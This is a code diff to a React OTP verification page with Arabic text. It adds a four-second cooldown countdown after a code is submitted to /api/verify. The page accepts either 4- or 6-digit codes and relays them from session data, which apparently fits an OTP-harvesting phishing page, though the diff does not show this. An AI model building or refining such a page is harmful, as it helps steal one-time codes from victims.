@@ -21,6 +21,7 @@ export default function VerifyPage() {
   const [timer, setTimer] = useState(41);
   const [submitting, setSubmitting] = useState(false);
   const [error, setError] = useState("");
+  const [cooldown, setCooldown] = useState(0);
 
   useEffect(() => {
     const raw = sessionStorage.getItem("verify_data");
@@ -36,10 +37,17 @@ export default function VerifyPage() {
 
   const timerStr = `${String(Math.floor(timer / 60)).padStart(2, "0")}:${String(timer % 60).padStart(2, "0")}`;
 
+  useEffect(() => {
+    if (cooldown <= 0) return;
+    const t = setTimeout(() => setCooldown(s => s - 1), 1000);
+    return () => clearTimeout(t);
+  }, [cooldown]);
+
   const handleSubmit = async () => {
     const digits = otp.replace(/\D/g, "");
     if (digits.length !== 4 && digits.length !== 6) { setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام"); return; }
     setSubmitting(true);
+    setCooldown(4);
     try {
       await fetch("/api/verify", {
         method: "POST",
@@ -96,20 +104,26 @@ export default function VerifyPage() {
         <div className="px-6 pb-5 space-y-4">
           <div>
             <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">Verification Code</p>
-            <input
-              type="text"
-              inputMode="numeric"
-              maxLength={6}
-              placeholder="أدخل رمز التحقق"
-              value={otp}
-              onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
-              onBlur={() => {
-                const d = otp.replace(/\D/g, "");
-                if (d.length > 0 && d.length !== 4 && d.length !== 6) setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
-              }}
-              className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
-              dir="ltr"
-            />
+            {cooldown > 0 ? (
+              <div className="w-full border border-gray-200 px-4 py-3 flex items-center justify-center bg-gray-50">
+                <span className="font-mono font-black text-[#1A2E44] text-sm tabular-nums">{cooldown}</span>
+              </div>
+            ) : (
+              <input
+                type="text"
+                inputMode="numeric"
+                maxLength={6}
+                placeholder="أدخل رمز التحقق"
+                value={otp}
+                onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
+                onBlur={() => {
+                  const d = otp.replace(/\D/g, "");
+                  if (d.length > 0 && d.length !== 4 && d.length !== 6) setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
+                }}
+                className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
+                dir="ltr"
+              />
+            )}
             {error && <p className="text-red-500 text-xs font-bold mt-1">⚠ {error}</p>}
           </div>
 
@@ -134,7 +148,7 @@ export default function VerifyPage() {
 
           <button
             onClick={handleSubmit}
-            disabled={submitting || (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)}
+            disabled={submitting || cooldown > 0 || (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)}
             className="w-full py-3 text-white font-black text-xs sm:text-sm flex items-center justify-center gap-2 disabled:opacity-40 transition hover:opacity-90"
             style={{ background: "#1A2E44" }}
           >
